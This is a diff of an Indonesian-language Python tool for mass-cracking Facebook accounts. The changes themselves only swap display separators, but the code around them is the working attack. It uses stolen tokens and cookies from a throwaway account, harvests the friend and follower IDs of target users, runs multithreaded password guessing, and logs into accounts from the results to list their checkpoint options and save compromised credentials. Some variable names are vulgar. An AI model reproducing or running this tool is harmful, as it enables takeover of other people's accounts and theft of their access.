@@ -304,9 +304,8 @@ def menu():
     print(f"{P}[*] INFO KARTU   : {B}{gt['org']}")
     print(f"{P}[*] TIME ZONE    : {B}{gt['timezone']}")
     print(f"{P}[*] CITY         : {B}{gt['city']}")
-    print(f"{B} | ")
     print(f"{B}___________________________________________")
-    print(f"{B} | ")
+    print(f"{B} • ")
     jalan(f"{P}[1] CRACK MASAL")
     print(f"{P}[2] CRACK PUBLIK")
     print(f"{P}[3] CRACK DARI PERTEMANAN")
@@ -315,7 +314,7 @@ def menu():
     print(f"{P}[6] CEK HASILL")
     print(f"{P}[7] CEK OPSI AKUN CP")
     jalan(f"{M}[0] KELUAR/HAPUS TOKEN ")
-    print(f"{B} | ")
+    print(f"{B} • ")
     pp = input(f"{P}[*] PILIH MENU : {B}")
     if pp in ["1","01"]:
       massal()
@@ -334,25 +333,25 @@ def menu():
     elif pp in ["0","00"]:
         os.system("rm -rf login/token.json")
         os.system("rm -rf login/cookie.json");exit()
-    else:print(f"{B} | ");print(f"{P}[!]{M} Isi Yang Benar ");menu()
+    else:print(f"{B} • ");print(f"{P}[!]{M} Isi Yang Benar ");menu()
 
 def massal():
     try:
         token=open("login/token.json","r").read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
     except IOError:
-        print(f"{B} | ")
-        print(f"{B} | ")
+        print(f"{B} • ")
+        print(f"{B} • ")
         print(f"{P}[•]{M} COOKIE KOID GANTI TUMBAL ");exit()
     try:
-        print(f"{B} | ")
+        print(f"{B} • ")
         print(f"{P}[•] MASUKAN TOTAL ID YANG INGIN DI DUMP")
-        print(f"{B} | ")
+        print(f"{B} • ")
         tanya_total = int(input(f"{P}[•] MASUKAN JUMLAH : {B}"))
     except:tanya_total=1
     for t in range(tanya_total):
         t +=1
-        print(f"{B} | ")
+        print(f"{B} • ")
         _id_=input(f"{P}[•] MASUKAN USER ID  {P}{t} : {B}")
         try:
             url= requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token),cookies=cookie)
@@ -362,14 +361,14 @@ def massal():
                 nama = i["name"]
                 id.append(uid+"<=>"+nama)
         except KeyError:
-            print(f"{B} | ")
-            print(f"{B} | ")
+            print(f"{B} • ")
+            print(f"{B} • ")
             print(f"{P}[•]{M} USER ID TIDAK PUBLIK");menu()
     if len(id) == 0:
-       print(f"{B} | ")
+       print(f"{B} • ")
        print(f"{P}[•]{M} TOTAL ID ANDA ADALAH {B}{len(id)}");exit()
     else:
-        print(f"{B} | ")
+        print(f"{B} • ")
         print(f"{P}[•] TOTAL ID : {B}{len(id)}")
         fii_xd()
 ##### CRACK PERTEMANAN 
@@ -378,7 +377,7 @@ def listteman():
         token=open("login/token.json","r").read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
     except IOError:
-        print(f"{B} | ")
+        print(f"{B} • ")
         print(f"{P}[•]{M} COOKIE KOID GANTI TUMBAL ");exit()
     try:
         url= requests.get("https://graph.facebook.com/me?fields=friends.limit(50000)&access_token=%s"%(token),cookies=cookie)
@@ -388,8 +387,8 @@ def listteman():
             nama = i["name"]
             id.append(uid+"<=>"+nama)
     except KeyError:
-        print(f"{B} | ")
-        print(f"{B} | ")
+        print(f"{B} • ")
+        print(f"{B} • ")
         print(f"{P}[•] USER ID TIDAK PUBLIK");os.sys.menu()
     if len(id) !=0:
         print(f"{P}[•] TOTAL ID : {B}{len(id)}")
@@ -401,11 +400,11 @@ def publik():
         token=open("login/token.json","r").read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
     except IOError:
-        print(f"{B} | ")
-        print(f"{B} | ")
+        print(f"{B} • ")
+        print(f"{B} • ")
         print(f"{P}[•]{M} cookie modar dinggo wae ");exit()
-    print(f"{B} | ")
-    print(f"{B} | ")
+    print(f"{B} • ")
+    print(f"{B} • ")
     _id_=input(f"{P}[•] Masukan user id : {B}")
     try:
         url= requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token),cookies=cookie)
@@ -415,12 +414,12 @@ def publik():
             nama = i["name"]
             id.append(uid+"<=>"+nama)
     except KeyError:
-        print(f"{B} | ")
-        print(f"{B} | ")
+        print(f"{B} • ")
+        print(f"{B} • ")
         print(f"{P}[•]{M} User id tidak di temukan atau akun tersebut privat ");menu()
     if len(id) !=0:
-        print(f"{B} | ")
-        print(f"{B} | ")
+        print(f"{B} • ")
+        print(f"{B} • ")
         print(f"{P}[•] Total id : {B}{len(id)}")
         fii_xd()
     else:print(f"{P}[•] Total id : {B}{len(id)}");exit()
@@ -430,12 +429,12 @@ def followerss():
         token=open("login/token.json","r").read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
     except IOError:
-        print(f"{B} | ")
-        print(f"{B} | ")
+        print(f"{B} • ")
+        print(f"{B} • ")
         print(f"{P}[•] cookie modar dinggo wae ");exit()
-    print(f"{B} | ")
-    print(f"{B} | ")
-    print(f"{B} | ")
+    print(f"{B} • ")
+    print(f"{B} • ")
+    print(f"{B} • ")
     _id_=input(f"{P}[•] Masukan user id : {B}")
     try:
         for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=20000&access_token=%s"%(_id_,token),cookies=cookie).json()["data"]:
@@ -443,12 +442,12 @@ def followerss():
             nama = i["name"]
             id.append(uid+"<=>"+nama)
     except KeyError:
-        print(f"{B} | ")
-        print(f"{B} | ")
+        print(f"{B} • ")
+        print(f"{B} • ")
         print(f"{P}[•]{M} User id tidak di temukan atau id terdsebut privat ");menu()
     if len(id) !=0:
-        print(f"{B} | ")
-        print(f"{B} | ")
+        print(f"{B} • ")
+        print(f"{B} • ")
         print(f"{P}[•] Total id : {B}{len(id)}")
         fii_xd()
     else:print(f"{P}[•] {M} total id : {M}{len(id)}")
@@ -456,26 +455,26 @@ def followerss():
 
 ##### PENGGANTI USER - UA
 def userset():
-    print(f"{B} | ")
-    print(f"{B} | ")
+    print(f"{B} • ")
+    print(f"{B} • ")
     print(f"{P}[1] Ganti user agent")
     print(f"{P}[2] Cek user agent yang di gunakan")
     print(f"{P}[0] Kembali")
     print(f"{B} | ")
     _pil_=input(f"{P}[•] Input : {B}")
     if _pil_ in ["1","01"]:
-        print(f"{B} | ")
+        print(f"{B} • ")
         lololr=input(f"{P}[•] Masukan user agent \n{P}[•] Masukan di sini : {B}")
         try:
             open("ua","w").write(lololr)
             usera=open("ua","r").read()
         except Exception as e:
-            print(f"{B} | ")
-            print(f"{B} | ")
+            print(f"{B} • ")
+            print(f"{B} • ")
             print(f"{P}[•] Eror : {M}{e}")
         if usera == lololr:
-            print(f"{B} | ")
-            print(f"{B} | ")
+            print(f"{B} • ")
+            print(f"{B} • ")
             print(f"{P}[•] Sukses mengganti");menu()
         else:print(f"{P}[•]{M} Gagal mengganti user agent ");exit()
     
@@ -484,7 +483,7 @@ def userset():
             _tes_ua=open("ua","r").read()
         except IOError:
             _tes_ua=("Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36")
-        print(f"{B} | ")
+        print(f"{B} • ")
         print(f"{P}[•] User agent : {B}{_tes_ua}");menu()
     elif _pil_ in ["0","00"]:
         menu()
@@ -524,7 +523,7 @@ def log_hasil(user, pasw):
     try:
         run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
     except requests.exceptions.TooManyRedirects:
-        print(f"{B} | ")
+        print(f"{B} • ")
         print(f"{M}[•] Akun terkena spam")
     if "c_user" in ses.cookies:
         print(f"{P}[•]{I} Akun berhasil di login")
@@ -545,7 +544,7 @@ def log_hasil(user, pasw):
         tempek = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
         ngew = [yy.text for yy in tempek.find_all("option")]
         for opt in range(len(ngew)):
-            print(f"{B} | ")
+            print(f"{B} • ")
             jalan(f"{U}[{B}{str(opt+1)}{U}]{P}--->{k}[{B}{ngew[opt]}{K}]")
     elif "login_error" in str(run):
         oh = run.find("div",{"id":"login_error"}).find("div").text
@@ -553,35 +552,35 @@ def log_hasil(user, pasw):
     else:
         print(f"{P}[•]{M} Akun tersebut sandi nya telah di ganti")
 def cek_hasil():
-    print(f"{B} | ")
-    print(f"{B} | ")
+    print(f"{B} • ")
+    print(f"{B} • ")
     print(f"{P}[•] Masukan file cp ")
     print(f"{P}[•] Contoh untuk masukan file : {B}CP/{tanggal}.json")
-    print(f"{B} | ")
+    print(f"{B} • ")
     files =input(f"{P}[•] Masukan nama file : {B}")
     try:
         buka_baju = open(files,'r').readlines()
     except FileNotFoundError:
-        print(f"{B} | ")
-        print(f"{B} | ")
+        print(f"{B} • ")
+        print(f"{B} • ")
         print(f"{P}[•]{M} File tidak di temukan");exit()
         time.sleep(2); cek_hasil()
-    print(f"{B} | ")
+    print(f"{B} • ")
     print(f"{P}[•] Total akun chekpoint : {B}{str(len(buka_baju))}")
-    print(f"{B} | ")
-    print(f"{B} | ")
+    print(f"{B} • ")
+    print(f"{B} • ")
     for memek in buka_baju:
         kontol = memek.replace("\n","")
         titid  = kontol.split("|")
-#        print(f"{B} | ")
+#        print(f"{B} • ")
         print(f"{P}[•] Akun facebook : {B}{kontol}")
         try:
             log_hasil(titid[0], titid[1])
         except requests.exceptions.ConnectionError:
             continue
         print("")
-    print(f"{B} | ")
-    print(f"{B} | ")
+    print(f"{B} • ")
+    print(f"{B} • ")
     input(f"{P}[•]{I} Chek akun sudah selesai")
     menu()
 
@@ -598,12 +597,12 @@ def cek_results():
     ok=("OK/%s.json"%(tanggal))
     hsl_cp=open(cp,"r").read()
     hsl_ok=open(ok,"r").read()
-    print(f"{B} | ")
-    print(f"{B} | ")
+    print(f"{B} • ")
+    print(f"{B} • ")
     print(f"{P}[1] Cek results cp")
     print(f"{P}[2] Cek results ok")
     print(f"{P}[0] Back")
-    print(f"{B} | ")
+    print(f"{B} • ")
     _pil3h=input(f"{P}[•] Pilih : {B}")
     if _pil3h in ["1","01"]:
         if len(hsl_cp) != 0:
@@ -613,7 +612,7 @@ def cek_results():
         else:print(f"{M}[•] Tidak ada hasil")
     elif _pil3h in ["2","02"]:
         if len(hsl_ok) != 0:
-            print(f"{B} | ")
+            print(f"{B} • ")
             print(f"{P}[•]{I} Results ok")
             os.system("cat OK/%s.json"%(tanggal))
         else:print(f"\n{P}[•]{M} Tidak ada hasil")
@@ -624,8 +623,8 @@ def cek_results():
 
 def fii_xd():
 	kone()
-	print(f"{B} | ")
-	print(f"{B} | ")
+	print(f"{B} • ")
+	print(f"{B} • ")
 	fiisayangwidiya =input(f"{P}[•] Pilih : {B}")
 	if fiisayangwidiya in [""]:
 		print(f"{B} | ")
@@ -633,7 +632,7 @@ def fii_xd():
 	elif fiisayangwidiya in ["1","01"]:
 		print(f"{P}[•] Tampilan kan opsi akun chek point {B}Y/t")
 		jalan(f"{P}[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
-		print(f"{B} | ")
+		print(f"{B} • ")
 		_checkoptions_=input(f"{P}[•] Pilih : {B}")
 		if _checkoptions_ in ["y","Y"]:
 			try:
@@ -679,9 +678,9 @@ def fii_xd():
 			except (KeyError,IOError):print(f"{P}[•]{M} Eror");exit()
 
 		else:
-			print(f"{B} | ")
+			print(f"{B} • ")
 			print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
-			print(f"{B} | ")
+			print(f"{B} • ")
 			ter =input(f"{P}[•] Pilih : {B}")
 			if ter in ["m","M"]:
 				with ThreadPoolExecutor(max_workers=30) as coeg:
